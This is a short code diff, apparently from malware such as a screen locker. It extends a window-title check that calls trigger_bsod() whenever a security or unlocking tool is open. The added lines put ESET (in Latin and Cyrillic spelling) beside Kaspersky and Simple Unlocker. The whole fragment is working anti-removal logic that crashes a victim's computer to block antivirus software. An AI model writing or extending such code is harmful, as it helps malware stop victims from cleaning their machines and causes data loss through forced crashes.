@@ -52,7 +52,9 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
     strstr(window_title, "kaspersky") != NULL ||
     strstr(window_title, "касперский") != NULL ||
     strstr(window_title, "simple unlocker") != NULL ||
-    strstr(window_title, "su") != NULL)
+    strstr(window_title, "su") != NULL ||
+    strstr(window_title, "eset") != NULL ||
+    strstr(window_title, "есет") != NULL)
     {
       trigger_bsod();
     }
